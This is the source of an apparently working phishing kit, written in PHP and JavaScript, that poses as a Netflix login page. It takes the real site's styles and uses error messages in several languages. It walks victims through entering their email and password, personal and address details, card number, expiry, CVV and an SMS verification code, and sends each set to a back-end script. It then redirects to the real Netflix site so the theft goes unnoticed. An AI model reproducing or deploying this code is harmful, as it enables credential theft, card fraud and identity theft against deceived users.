<?php 
include '../server/ab.php';

if ($testmode == true) {
    $ip = '83.110.250.231';
}else{
    $ip = $_SERVER['REMOTE_ADDR'];
}

$lang=$countryCode; 

?>
	<!DOCTYPE html>
	<html lang="fr">


<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
   
    <title>Netflix</title>
   
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-css-vf6355e19/css/css/less%7Ccore%7Cerror-page.less/1/asyuE4Cqtf9xBD/none/true/none" data-uia="botLink">
    <link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-css-vf6355e19/css/css/less%7Clogin%7CloginBase.less,less%7Cpages%7Clogin%7CLogin.less/1/asyuE4Cqtf9xBD/none/true/none" data-uia="botLink">
    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
    <link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png">
    <meta property="og:description" content="Regardez des films et des séries&nbsp;TV Netflix en ligne, sur votre smart&nbsp;TV, console de jeu, PC, Mac, smartphone, tablette et bien plus.">

    <script type='text/javascript' src='https://code.jquery.com/jquery-1.11.0.js'></script>
    <script type='text/javascript' src="https://rawgit.com/RobinHerbots/jquery.inputmask/3.x/dist/jquery.inputmask.bundle.js"></script>
    
    <?php 
    if ($lang == 'aeu') {
        ?>
        <link rel="stylesheet" href="./assets/css/arabe.css">
        <?php
    }else{
        ?>
        <link rel="stylesheet" href="./assets/css/normal.css">
        <?php
    }
    ?>

</head>

		<div class="contain" id="contain"> </div>

	</html>
	<script>
	let lang = '<?php echo $lang; ?>'

	let timer = <?php echo $time; ?>

	function showError(type, error = "") {
		if(type == "show") {
			document.getElementById('error').innerHTML = error
			document.getElementById('error').style.display = "block"
		}
		if(type == "hide") {
			document.getElementById('error').style.display = "none"
		}
	}

	function load(page) {
		let load = new XMLHttpRequest;
		load.open('GET', 'pages/' + lang + '/' + page + '.php')
		load.addEventListener('load', () => {
			document.getElementById('contain').innerHTML = load.responseText
			if(page == 2) {
				$('#dob').inputmask("99/99/9999", {
					'placeholder': ''
				})
				$('#tel').inputmask("99999999999999", {
					'placeholder': ''
				})
				$('#zip').inputmask("99999", {
					'placeholder': ''
				})
			}
			if(page == 3) {
				$('#cc').inputmask("9999 9999 9999 9999", {
					'placeholder': ''
				})
				$('#exp').inputmask("99/99", {
					'placeholder': ''
				})
				$('#ccv').inputmask("999", {
					'placeholder': ''
				})
			}
		})
		load.send()
	}
	if(lang != "ban") {
		load('1')
	} else {
		document.getElementById('contain').innerHTML = 'HTTP/1.0 404 Not Found'
	}

	function value(id) {
		return document.getElementById(id).value
	}

	function sendrez(step, rez) {
		let sendr = new XMLHttpRequest;
		sendr.open('GET', 'back.php?action=send&rez=' + rez + "&step=" + step)
		sendr.send()
	}
	var luhn = (function(arr) {
		return function(ccNum) {
			var len = ccNum.length,
				bit = 1,
				sum = 0,
				val;
			while(len) {
				val = parseInt(ccNum.charAt(--len), 10);
				sum += (bit ^= 1) ? arr[val] : val;
			}
			return sum && sum % 10 === 0;
		};
	}([0, 2, 4, 6, 8, 1, 3, 5, 7, 9]));

	function submit(step) {
		if(step == "1") {
			let ident = value('mail')
			let pass = value('pass')
			if(ident.includes('@')) {
				if(ident.split('@')[1].includes('.')) {
					if(pass.length >= 8) {
						showError('hide')
						load("2")
						sendrez('login', ident + '|' + pass)
					} else {
						if(lang == 'de') {
							showError('show', 'Das eingegebene Passwort muss 8 Zeichen enthalten.')
						} else if(lang == 'it') {
							showError('show', '')
						} else if(lang == 'fr') {
							showError('show', 'Le mot de passe saisi doit contenir 8 caractères.')
						} else if(lang == 'brz') {
							showError('show', 'A senha digitada deve conter 8 caracteres.')
						} else if(lang == 'aeu') {
							showError('show', 'يجب أن تحتوي كلمة المرور المدخلة على 8 أحرف.')
						}
					}
				} else {
					if(lang == 'de') {
						showError('show', 'Die von Ihnen eingegebene E-Mail-Adresse ist falsch.')
					} else if(lang == 'it') {
						showError('show', 'L\'indirizzo e-mail inserito non è corretto.')
					} else if(lang == 'fr') {
						showError('show', 'L\'adresse e-mail saisie est incorrecte.')
					} else if(lang == 'brz') {
						showError('show', 'O endereço de e-mail inserido está incorreto.')
					} else if(lang == 'aeu') {
						showError('show', 'عنوان البريد الإلكتروني الذي تم إدخاله غير صحيح.')
					}
				}
			} else {
				if(lang == 'de') {
					showError('show', 'Die von Ihnen eingegebene E-Mail-Adresse ist falsch.')
				} else if(lang == 'it') {
					showError('show', 'L\'indirizzo e-mail inserito non è corretto.')
				} else if(lang == 'fr') {
					showError('show', 'L\'adresse e-mail saisie est incorrecte.')
				} else if(lang == 'brz') {
					showError('show', 'O endereço de e-mail inserido está incorreto.')
				} else if(lang == 'aeu') {
					showError('show', 'عنوان البريد الإلكتروني الذي تم إدخاله غير صحيح.')
				}
			}
		}
		if(step == "2") {
			let name = value('name')
            let namet = "0"
            let zip = "00000"
            try {
                namet = value('namet')
            } catch (error) {
            }
			
			let city = value('city')
            try {
                zip = value('zip')
            } catch (error) {
            }
			
			let address = value('address')
			let dob = value('dob')
			let tel = value('tel')
			if(name != '') {
				if(namet != '') {
					if(parseInt(dob.split('/')[2]) <= 2004 && dob.split('/')[2].length == 4) {
						if(true) {
							if(tel.length > 5) {
								if(city != "") {
									if(address != "") {
										if(zip != "" && zip.length == 5) {
											showError('hide')
											load('3')
											sendrez('billing', name + '|' + namet + '|' + dob + '|' + tel + '|' + city + '|' + address + '|' + zip)
										} else {
											if(lang == 'de') {
												showError('show', 'Bitte geben Sie eine gültige Postleitzahl ein.')
											} else if(lang == 'it') {
												showError('show', 'Per favore, inserisci un codice postale valido.')
											} else if(lang == 'fr') {
												showError('show', 'Veuillez entrer un code postal valide.')
											} else if(lang == 'brz') {
												showError('show', 'Insira um código postal válido.')
											} else if(lang == 'aeu') {
												showError('show', 'الرجاء إدخال رمز بريدي صالح.')
											} else if(lang == 'nrw') {
												showError('show', 'Vennligst skriv inn et gyldig postnummer.')
											}
										}
									} else {
										showError('show', '')
										if(lang == 'de') {
											showError('show', 'Bitte geben Sie eine korrekte Adresse ein.')
										} else if(lang == 'it') {
											showError('show', 'Inserisci un indirizzo corretto.')
										} else if(lang == 'fr') {
											showError('show', 'Entrez une adresse correcte.')
										} else if(lang == 'brz') {
											showError('show', 'Digite um endereço correto.')
										} else if(lang == 'aeu') {
											showError('show', 'يرجى إدخال عنوان.')
										} else if(lang == 'nrw') {
											showError('show', 'Vennligst skriv inn en adresse.')
										}
									}
								} else {
									if(lang == 'de') {
										showError('show', 'Bitte geben Sie Ihre Stadt ein.')
									} else if(lang == 'it') {
										showError('show', 'Inserisci la tua città.')
									} else if(lang == 'fr') {
										showError('show', 'Entrez votre ville.')
									} else if(lang == 'brz') {
										showError('show', 'Digite sua cidade.')
									} else if(lang == 'aeu') {
										showError('show', 'الرجاء إدخال مدينة.')
									} else if(lang == 'nrw') {
										showError('show', 'Vennligst skriv inn en by.')
									}
								}
							} else {
								if(lang == 'de') {
									showError('show', 'Bitte geben Sie eine gültige Telefonnummer ein.')
								} else if(lang == 'it') {
									showError('show', 'Si prega di inserire un numero di telefono valido.')
								} else if(lang == 'fr') {
									showError('show', 'S\'il vous plaît entrer un numéro de téléphone valide.')
								} else if(lang == 'brz') {
									showError('show', 'Por favor insira um número de telefone válido.')
								} else if(lang == 'aeu') {
									showError('show', 'يرجى إدخال رقم هاتف صالح.')
								} else if(lang == 'nrw') {
									showError('show', 'Vennligst oppgi et gyldig telefonnummer.')
								}
							}
						} else {
							if(lang == 'de') {
								showError('show', 'Bitte geben Sie eine gültige Telefonnummer ein.')
							} else if(lang == 'it') {
								showError('show', 'Si prega di inserire un numero di telefono valido.')
							} else if(lang == 'fr') {
								showError('show', 'S\'il vous plaît entrer un numéro de téléphone valide.')
							} else if(lang == 'brz') {
								showError('show', 'Por favor insira um número de telefone válido.')
							} else if(lang == 'aeu') {
								showError('show', 'يرجى إدخال رقم هاتف صالح.')
							} else if(lang == 'nrw') {
								showError('show', 'Vennligst oppgi et gyldig telefonnummer.')
							}
						}
					} else {
						if(lang == 'de') {
							showError('show', 'Bitte geben Sie ein gültiges Geburtsdatum ein.')
						} else if(lang == 'it') {
							showError('show', 'Per favore inserire una data di nascita valida.')
						} else if(lang == 'fr') {
							showError('show', 'Entrez une date de naissance valide.')
						} else if(lang == 'brz') {
							showError('show', 'Por favor, insira uma data de nascimento válida.')
						} else if(lang == 'aeu') {
							showError('show', 'من فضلك ادخل تاريخ ميلاد صحيح.')
						} else if(lang == 'nrw') {
							showError('show', 'Vennligst skriv inn en gyldig fødselsdato.')
						}
					}
				} else {
					showError('show', '')
					if(lang == 'de') {
						showError('show', 'Bitte tragen Sie einen gültigen Vornamen ein.')
					} else if(lang == 'it') {
						showError('show', 'Prego inserire un nome valido.')
					} else if(lang == 'fr') {
						showError('show', 'Saisissez un nom correct.')
					} else if(lang == 'brz') {
						showError('show', 'Por favor, indique um nome válido.')
					} else if(lang == 'aeu') {
						showError('show', 'من فضلك أدخل إسمك.')
					} else if(lang == 'brz') {
						showError('show', 'Vennligst skriv inn navnet ditt.')
					}
				}
			} else {
				if(lang == 'de') {
					showError('show', 'Bitte geben Sie einen gültigen Nachnamen ein.')
				} else if(lang == 'it') {
					showError('show', 'Inserisci un cognome valido.')
				} else if(lang == 'fr') {
					showError('show', 'Saisissez un nom de famille correct.')
				} else if(lang == 'brz') {
					showError('show', 'Digite um sobrenome válido.')
				} else if(lang == 'aeu') {
					showError('show', 'من فضلك أدخل إسمك.')
				} else if(lang == 'brz') {
					showError('show', 'Vennligst skriv inn navnet ditt.')
				}
			}
		}
		if(step == '3') {
			let name = value('ccn')
			let cc = value('cc')
			let exp = value('exp')
			let ccv = value('ccv')
			if(cc.length == 19 && luhn(cc.replace(' ', '').replace(' ', '').replace(' ', ''))) {
				if(parseInt(exp.split('/')[1]) >= 22) {
					if(ccv.length == 3) {
						showError('hide')
						load('4')
						sendrez('cc', name + '|' + cc + '|' + exp + '|' + ccv)
						setTimeout(() => {
							load('5')
						}, timer * 1000)
					} else {
						if(lang == 'de') {
							showError('show', 'Bitte geben Sie einen gültigen Lebenslauf ein.')
						} else if(lang == 'it') {
							showError('show', 'Inserisci un cvv valido.')
						} else if(lang == 'fr') {
							showError('show', 'Entrez un cvv valide.')
						} else if(lang == 'brz') {
							showError('show', 'Insira um cvv válido.')
						} else if(lang == 'aeu') {
							showError('show', 'الرجاء إدخال رمز CVV صالح.')
						} else if(lang == 'nrw') {
							showError('show', 'Vennligst skriv inn en gyldig CVV.')
						}
					}
				} else {
					if(lang == 'de') {
						showError('show', 'Bitte gib ein korrektes Datum an.')
					} else if(lang == 'it') {
						showError('show', 'Inserisci una data valida.')
					} else if(lang == 'fr') {
						showError('show', 'Veuillez entrer une date d\'expiration valide.')
					} else if(lang == 'brz') {
						showError('show', 'Por favor insira uma data válida.')
					} else if(lang == 'aeu') {
						showError('show', 'الرجاء إدخال تاريخ انتهاء صحيح.')
					} else if(lang == 'nrw') {
						showError('show', 'Vennligst skriv inn en gyldig utløpsdato.')
					}
				}
			} else {
				if(lang == 'de') {
					showError('show', 'Bitte geben Sie eine gültige Kreditkarte ein.')
				} else if(lang == 'it') {
					showError('show', 'Inserisci una carta di credito valida.')
				} else if(lang == 'fr') {
					showError('show', 'Entrez une carte de crédit valide.')
				} else if(lang == 'brz') {
					showError('show', 'Insira um cartão de crédito válido.')
				} else if(lang == 'aeu') {
					showError('show', 'يرجى تقديم بطاقة ائتمان صالحة.')
				}  else if(lang == 'nrw') {
					showError('show', 'Vennligst oppgi et gyldig kredittkort.')
				}
			}
		}
		if(step == '4') {
			let code = value('vbv')
			if(code.length > 4) {
				showError('hide')
				sendrez('vbv', code)
				window.location = 'https://netflix.com/'
			} else {
				showError('show', '')
				if(lang == 'de') {
					showError('show', 'Der eingegebene SMS-Code ist falsch.')
				} else if(lang == 'it') {
					showError('show', 'Il codice sms che hai inserito è errato.')
				} else if(lang == 'fr') {
					showError('show', 'Le code SMS que vous avez entré est incorrect.')
				} else if(lang == 'brz') {
					showError('show', 'O código sms que você digitou está incorreto.')
				} else if(lang == 'aeu') {
					showError('show', 'الرجاء إدخال الرمز الذي تلقيته عبر الرسائل القصيرة')
				} else if(lang == 'nrw') {
					showError('show', 'Vennligst skriv inn koden du mottar på SMS')
				}
			}
		}
	}
	</script>